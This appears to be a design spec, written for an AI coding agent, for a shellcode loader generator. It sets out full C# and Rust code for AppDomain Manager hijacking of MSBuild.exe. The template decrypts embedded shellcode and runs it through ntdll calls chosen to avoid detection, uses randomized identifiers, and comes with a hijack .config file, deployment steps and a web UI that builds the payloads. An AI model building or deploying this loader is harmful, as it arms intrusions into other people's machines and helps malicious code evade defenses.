# AppDomain Manager Hijacking — Design Spec

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Fix the broken `AppDomain` loader type so it correctly implements AppDomain Manager Hijacking — a LOLBin technique where a managed C# DLL is loaded by the CLR as the AppDomain Manager of an existing .NET host (MSBuild.exe), executing shellcode inside that host's process.

**Architecture:** Replace the current (broken) native Rust cdylib template with a proper managed C# template compiled via `csc.exe`. The template-engine moves `LoaderType::AppDomain` from `PeCompiled` to `DotNetCompiled` category. A companion `.config` file is generated and returned as a string field in the job-done message; the UI displays it as copyable text.

**Tech Stack:** Rust (template-engine), C# (generated payload), Tera (templating), Axum 0.7 (backend), React 18 + TypeScript (frontend). No new dependencies.

---

## Background: Why the Current Implementation Is Broken

The existing `appdomain.rs.tera` generates a **native Rust cdylib** with a `DllMain` entry point. The CLR does not invoke `DllMain` for AppDomain Manager loading — it requires a **managed .NET assembly** that subclasses `AppDomainManager`. Additionally:

- `appdomain.config.tera` is missing the `<AppDomainManagerAssembly>` element, so the .config does not point to any assembly.
- `load_assembly_appdomain()` in `loader-scaffold` calls `ICLRRuntimeHost2::ExecuteInDefaultAppDomain` (vtable offset 11), which takes a **file path** as `LPCWSTR` — not raw bytes. The template passes raw shellcode bytes cast to `*const u16`, which produces garbage.
- `web-server/src/api/generate.rs` hardcodes `appdomain_config: None` in `LoaderConfig` construction and has no `appdomain_config` field in `GenerateRequest`.

---

## Technique: AppDomain Manager Hijacking

1. A managed C# DLL subclasses `System.AppDomainManager` and overrides `InitializeNewDomain()`.
2. A companion `.config` file (`MSBuild.exe.config`) specifies `<AppDomainManagerType>` and `<AppDomainManagerAssembly>` pointing to the DLL.
3. Both files are placed in the same directory as `MSBuild.exe`.
4. Running `MSBuild.exe` causes the CLR to load the DLL as AppDomain Manager before any user code executes.
5. `InitializeNewDomain()` fires, decrypts the shellcode, and executes it via ntdll P/Invoke.

**Execution command:**
```
1. Place loader.dll and MSBuild.exe.config in:
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
2. Run: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

---

## Out of Scope

- Other CLR host targets beyond MSBuild.exe (configurable target is a separate feature).
- `loader-scaffold/src/inject/appdomain.rs` cleanup (the ICLRRuntimeHost2 code is unused after this fix — leave for now, do not delete).
- AMSI/ETW bypass in C# (existing VBA/script bypasses are separate; C# bypass is a separate feature).
- Process injection from within `InitializeNewDomain()`.

---

## Shellcode Execution in C# (InitializeNewDomain)

Uses ntdll P/Invoke — no kernel32 IAT entries:

```csharp
[DllImport("ntdll.dll")] static extern int NtAllocateVirtualMemory(
    IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits,
    ref UIntPtr RegionSize, uint AllocationType, uint Protect);

[DllImport("ntdll.dll")] static extern int NtProtectVirtualMemory(
    IntPtr ProcessHandle, ref IntPtr BaseAddress,
    ref UIntPtr RegionSize, uint NewProtect, out uint OldProtect);

[DllImport("ntdll.dll")] static extern int NtCreateThreadEx(
    out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes,
    IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
    bool CreateSuspended, int StackZeroBits,
    int SizeOfStackCommit, int SizeOfStackReserve, IntPtr AttributeList);
```

Execution flow inside `InitializeNewDomain()`:
1. Decrypt shellcode with AES-256-CBC or ChaCha20 (matching `config.encryption`)
2. `NtAllocateVirtualMemory(-1, &addr, 0, &size, MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_READWRITE=0x04)`
3. `Marshal.Copy(decrypted, 0, addr, len)`
4. `NtProtectVirtualMemory(-1, &addr, &size, PAGE_EXECUTE_READ=0x20, &old)`
5. `NtCreateThreadEx(&hThread, GENERIC_ALL=0x1FFFFF, null, -1, addr, null, false, 0, 0, 0, null)`

---

## File Changes

### template-engine

#### Modified: `src/lib.rs`

**1. `AppDomainConfig` struct** — remove unused fields, add `assembly_name`/`namespace`:
```rust
pub struct AppDomainConfig {
    pub clr_version:   String,  // e.g. "v4.0.30319"
    pub net_version:   String,  // e.g. "4.0"
    pub assembly_name: String,  // random ident — DLL filename stem for .config
    pub type_name:     String,  // random ident — C# class name
    pub namespace:     String,  // random ident — C# namespace
}
```

**2. `category()` method** — move `AppDomain` from `PeCompiled` to `DotNetCompiled`:
```rust
Binary | Dll | Injector | Rundll32 => OutputCategory::PeCompiled,
// AppDomain removed from PeCompiled
AppDomain | InstallUtil => OutputCategory::DotNetCompiled,
```

**3. `output_extension()` method** — AppDomain stays `"dll"` (managed DLL).

**4. `exec_command()` method** — update AppDomain:
```rust
AppDomain => format!(
    "1. Place {} and MSBuild.exe.config in C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\\n\
     2. Run: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe",
    filename
),
```

**5. `generate_csharp_source()` function** — dispatch by `LoaderType`:
```rust
pub fn generate_csharp_source(config: &LoaderConfig) -> Result<String, String> {
    let tera = build_tera()?;
    let ctx = build_context(config);
    let template_name = match config.loader_type {
        LoaderType::AppDomain   => "csharp/appdomain_manager.cs.tera",
        LoaderType::InstallUtil => "csharp/installutil.cs.tera",
        other => return Err(format!("not a .NET type: {:?}", other)),
    };
    tera.render(template_name, &ctx).map_err(|e| e.to_string())
}
```

**6. `build_context()`** — pass `appdomain_config` fields to Tera context:
```rust
if let Some(ad) = &config.appdomain_config {
    ctx.insert("appdomain_assembly_name", &ad.assembly_name);
    ctx.insert("appdomain_type_name",     &ad.type_name);
    ctx.insert("appdomain_namespace",     &ad.namespace);
    ctx.insert("appdomain_clr_version",   &ad.clr_version);
    ctx.insert("appdomain_net_version",   &ad.net_version);
}
```

**7. `AppDomainTemplateConfig` struct** — add `assembly_name` field:
```rust
pub struct AppDomainTemplateConfig {
    pub clr_version:   String,
    pub net_version:   String,
    pub appdomain_name:  String,  // fully-qualified type: "namespace.ClassName"
    pub assembly_name: String,    // DLL stem for AppDomainManagerAssembly value
}
```

**8. `generate_appdomain_config()`** — pass new field to context:
```rust
ctx.insert("assembly_name", &config.assembly_name);
```

#### New: `templates/csharp/appdomain_manager.cs.tera`

Full C# source template. Uses Tera variables already available in `build_context()`:
- `appdomain_namespace`, `appdomain_type_name` — class identity
- `v.var_shellcode`, `v.var_key`, `v.var_iv`, `v.var_ptr`, `v.var_region`, `v.fn_decrypt` — randomized identifiers
- `shellcode_hex | hex_bytes`, `key_hex | hex_bytes`, `iv_hex | hex_bytes` — byte arrays
- `config.encryption` — selects AES-256-CBC vs ChaCha20 decrypt implementation

```csharp
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace {{ appdomain_namespace }} {
    public class {{ appdomain_type_name }} : AppDomainManager {

        [DllImport("ntdll.dll")] static extern int NtAllocateVirtualMemory(
            IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits,
            ref UIntPtr RegionSize, uint AllocationType, uint Protect);
        [DllImport("ntdll.dll")] static extern int NtProtectVirtualMemory(
            IntPtr ProcessHandle, ref IntPtr BaseAddress,
            ref UIntPtr RegionSize, uint NewProtect, out uint OldProtect);
        [DllImport("ntdll.dll")] static extern int NtCreateThreadEx(
            out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes,
            IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
            bool CreateSuspended, int StackZeroBits,
            int SizeOfStackCommit, int SizeOfStackReserve, IntPtr AttributeList);

        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
            byte[] {{ v.var_key }} = new byte[] {
                {%- for b in key_hex | hex_bytes %}{{ b }},{% endfor %}
            };
            byte[] {{ v.var_iv }} = new byte[] {
                {%- for b in iv_hex | hex_bytes %}{{ b }},{% endfor %}
            };
            byte[] {{ v.var_shellcode }} = new byte[] {
                {%- for b in shellcode_hex | hex_bytes %}{{ b }},{% endfor %}
            };

            byte[] {{ v.var_ptr }} = {{ v.fn_decrypt }}({{ v.var_shellcode }}, {{ v.var_key }}, {{ v.var_iv }});

            IntPtr {{ v.var_region }} = IntPtr.Zero;
            UIntPtr {{ v.var_fiber }} = (UIntPtr){{ v.var_ptr }}.Length;
            NtAllocateVirtualMemory((IntPtr)(-1), ref {{ v.var_region }}, UIntPtr.Zero,
                ref {{ v.var_fiber }}, 0x3000, 0x04);
            Marshal.Copy({{ v.var_ptr }}, 0, {{ v.var_region }}, {{ v.var_ptr }}.Length);
            uint {{ v.fn_setup }}_old;
            NtProtectVirtualMemory((IntPtr)(-1), ref {{ v.var_region }},
                ref {{ v.var_fiber }}, 0x20, out {{ v.fn_setup }}_old);
            IntPtr {{ v.fn_run }}_h;
            NtCreateThreadEx(out {{ v.fn_run }}_h, 0x1FFFFF, IntPtr.Zero, (IntPtr)(-1),
                {{ v.var_region }}, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }

        static byte[] {{ v.fn_decrypt }}(byte[] data, byte[] key, byte[] iv) {
            {%- if config.encryption == "Aes256" %}
            using (var aes = Aes.Create()) {
                aes.Key = key; aes.IV = iv; aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
                using (var dec = aes.CreateDecryptor())
                    return dec.TransformFinalBlock(data, 0, data.Length);
            }
            {%- else %}
            // ChaCha20 — pure managed implementation
            return {{ v.fn_decrypt }}_chacha(data, key, iv);
            {%- endif %}
        }

        {%- if config.encryption != "Aes256" %}
        static byte[] {{ v.fn_decrypt }}_chacha(byte[] data, byte[] key, byte[] iv) {
            // ChaCha20 keystream XOR — RFC 7539 quarter-round implementation
            // State: 16 uint (constants[4] + key[8] + counter[1] + nonce[3])
            // Generate keystream blocks, XOR against ciphertext, return plaintext.
            // Pure C# managed implementation, no P/Invoke, no NuGet packages.
            // Full implementation provided in the Tera template file.
            uint[] state = new uint[16];
            // constants
            state[0] = 0x61707865; state[1] = 0x3320646e;
            state[2] = 0x79622d32; state[3] = 0x6b206574;
            // key (8 x uint, little-endian)
            for (int i = 0; i < 8; i++)
                state[4 + i] = BitConverter.ToUInt32(key, i * 4);
            // counter = 0
            state[12] = 0;
            // nonce (3 x uint from iv[0..12])
            for (int i = 0; i < 3; i++)
                state[13 + i] = BitConverter.ToUInt32(iv, i * 4);
            byte[] output = new byte[data.Length];
            int pos = 0;
            while (pos < data.Length) {
                uint[] block = (uint[])state.Clone();
                for (int r = 0; r < 20; r += 2) {
                    // column rounds
                    QR(ref block, 0,4,8,12); QR(ref block,1,5,9,13);
                    QR(ref block,2,6,10,14); QR(ref block,3,7,11,15);
                    // diagonal rounds
                    QR(ref block,0,5,10,15); QR(ref block,1,6,11,12);
                    QR(ref block,2,7,8,13);  QR(ref block,3,4,9,14);
                }
                for (int i = 0; i < 16; i++) block[i] += state[i];
                byte[] keystream = new byte[64];
                Buffer.BlockCopy(block, 0, keystream, 0, 64);
                for (int i = 0; i < 64 && pos < data.Length; i++, pos++)
                    output[pos] = (byte)(data[pos] ^ keystream[i]);
                state[12]++;
            }
            return output;
        }
        static void QR(ref uint[] s, int a, int b, int c, int d) {
            s[a] += s[b]; s[d] ^= s[a]; s[d] = s[d] << 16 | s[d] >> 16;
            s[c] += s[d]; s[b] ^= s[c]; s[b] = s[b] << 12 | s[b] >> 20;
            s[a] += s[b]; s[d] ^= s[a]; s[d] = s[d] <<  8 | s[d] >> 24;
            s[c] += s[d]; s[b] ^= s[c]; s[b] = s[b] <<  7 | s[b] >> 25;
        }
        {%- endif %}
    }
}
```

#### Modified: `templates/appdomain.config.tera`

Add `<AppDomainManagerAssembly>` and fix fully-qualified type name:
```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <startup>
    <supportedRuntime version="{{ clr_version }}" sku=".NETFramework,Version=v{{ net_version }}" />
  </startup>
  <runtime>
    <AppDomainManagerType value="{{ appdomain_name }}" />
    <AppDomainManagerAssembly value="{{ assembly_name }}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
  </runtime>
</configuration>
```

(`appdomain_name` = fully-qualified type e.g. `mXkzPqRt.nBvWsLqY`; `assembly_name` = DLL stem e.g. `dKqRmFpX`)

#### Deleted: `templates/appdomain.rs.tera`

The native Rust template is no longer used. Delete it. The `loader-scaffold/src/inject/appdomain.rs` file is left untouched (unused but not deleted per scope).

---

### web-server

#### Modified: `src/api/generate.rs`

**`GenerateRequest`** — add `appdomain_config` field:
```rust
#[derive(Deserialize)]
pub struct GenerateRequest {
    // ...existing fields...
    pub appdomain_config: Option<AppDomainReq>,
}

#[derive(Deserialize)]
pub struct AppDomainReq {
    #[serde(default = "default_clr_version")]
    pub clr_version: String,
    #[serde(default = "default_net_version")]
    pub net_version: String,
}

fn default_clr_version() -> String { "v4.0.30319".into() }
fn default_net_version() -> String { "4.0".into() }
```

**`LoaderConfig` construction** — wire `appdomain_config`:

`rand_ident` is a private function in `template-engine`. The web-server generates random identifiers using `rand` (already a dependency):
```rust
fn rand_hex_ident(len: usize) -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    let first = (rng.gen_range(b'a'..=b'z') as char).to_string();
    let rest: String = (0..len.saturating_sub(1))
        .map(|_| rng.sample(rand::distributions::Alphanumeric) as char)
        .collect();
    format!("{}{}", first, rest)
}

let appdomain_config = if loader_type == LoaderType::AppDomain {
    let req_ad = req.appdomain_config.unwrap_or(AppDomainReq {
        clr_version: "v4.0.30319".into(),
        net_version: "4.0".into(),
    });
    Some(template_engine::AppDomainConfig {
        clr_version:   req_ad.clr_version,
        net_version:   req_ad.net_version,
        assembly_name: rand_hex_ident(12),
        type_name:     rand_hex_ident(10),
        namespace:     rand_hex_ident(8),
    })
} else {
    None
};
```

**Job done message** — generate `.config` and include in status:
```rust
// After successful compile, before sending done status:
let config_xml = if loader_cfg.loader_type == LoaderType::AppDomain {
    loader_cfg.appdomain_config.as_ref().map(|ad| {
        template_engine::generate_appdomain_config(&template_engine::AppDomainTemplateConfig {
            clr_version:    ad.clr_version.clone(),
            net_version:    ad.net_version.clone(),
            appdomain_name: format!("{}.{}", ad.namespace, ad.type_name),
            assembly_name:  ad.assembly_name.clone(),
        }).unwrap_or_default()
    })
} else {
    None
};
tx.send(JobStatus::Done { download_id, config_xml }).ok();
```

**`JobStatus::Done`** — add optional `config_xml`:
```rust
Done { download_id: String, config_xml: Option<String> },
```

The WebSocket serialization of `JobStatus` must include `config_xml` in the `done` variant payload.

---

### frontend

#### Modified: `src/api/generate.ts`

Update `AppDomainReq` (remove unused fields):
```typescript
export interface AppDomainReq {
  clr_version?: string  // optional, server defaults to "v4.0.30319"
  net_version?: string  // optional, server defaults to "4.0"
}
```

`GenerateRequest` already has `appdomain_config?: AppDomainReq` — no change needed.

#### Modified: `src/pages/GeneratorPage.tsx`

Extend the `status` handler to capture `config_xml`:
```typescript
const [configXml, setConfigXml] = useState<string | null>(null)

// In useEffect for status:
if (status.status === 'done') {
  setBuildStatus('done')
  if (status.download_id) setArtifactId(status.download_id)
  if (status.config_xml)  setConfigXml(status.config_xml)
}
```

Pass `configXml` to `<BuildConsole>`.

#### Modified: `src/components/BuildConsole.tsx`

Add prop `configXml?: string | null`. When `status === 'done'` and `configXml` is set, render below the Download button:

```
┌─────────────────────────────────────────┐
│ MSBuild.exe.config                 Copy │
│ ─────────────────────────────────────── │
│ <?xml version="1.0" encoding=...        │
│ <configuration>                         │
│   <runtime>                             │
│     <AppDomainManagerType value=.../>   │
│     <AppDomainManagerAssembly .../>     │
│   </runtime>                            │
│ </configuration>                        │
└─────────────────────────────────────────┘
```

Read-only `<textarea>` with a "Copy" button (same pattern as existing copy-link buttons in DeliveryCard).

#### Modified: `src/components/OutputSection.tsx`

When `loaderType === 'AppDomain'`, show optional config section below the loader type selector:
```
CLR Version  [v4.0.30319        ]  (default shown as placeholder)
.NET Version [4.0               ]  (default shown as placeholder)
Note: Defaults work for all Windows 10/11 machines with .NET 4.x installed.
```

If left empty, the frontend sends `appdomain_config: undefined` and backend uses defaults.

---

## Data Flow (end to end)

```
User selects AppDomain + uploads shellcode.bin
  → GenerateRequest { loader_type: "AppDomain", shellcode_hex, appdomain_config: { clr_version, net_version } }
  → backend: builds LoaderConfig with random assembly_name/type_name/namespace
  → generate_csharp_source() → C# source
  → csc.exe /target:library /nologo /out:{tmp}.dll {tmp}.cs
  → artifact stored as {download_id}.dll
  → generate_appdomain_config() → .config XML string
  → JobStatus::Done { download_id, config_xml: Some(...) }
  → WebSocket → GeneratorPage → BuildConsole
  → UI shows: Download DLL button + MSBuild.exe.config copyable textarea
  → User deploys: place DLL + .config in MSBuild.exe directory → run MSBuild.exe
  → CLR loads DLL as AppDomain Manager → InitializeNewDomain() → shellcode executes
```

---

## Testing

- `template-engine`: unit test `test_appdomain_csharp_renders()` — verify generated C# contains `AppDomainManager`, DllImport ntdll strings, and shellcode bytes. Verify `generate_appdomain_config()` includes both `AppDomainManagerType` and `AppDomainManagerAssembly`.
- `web-server`: integration test — POST `/api/v1/generate` with `loader_type: "AppDomain"` (mocked compile), verify `config_xml` in done message is non-null and contains `AppDomainManagerAssembly`.
- `frontend`: update `BuildConsole.test.tsx` — test that `configXml` prop renders a textarea with correct label.
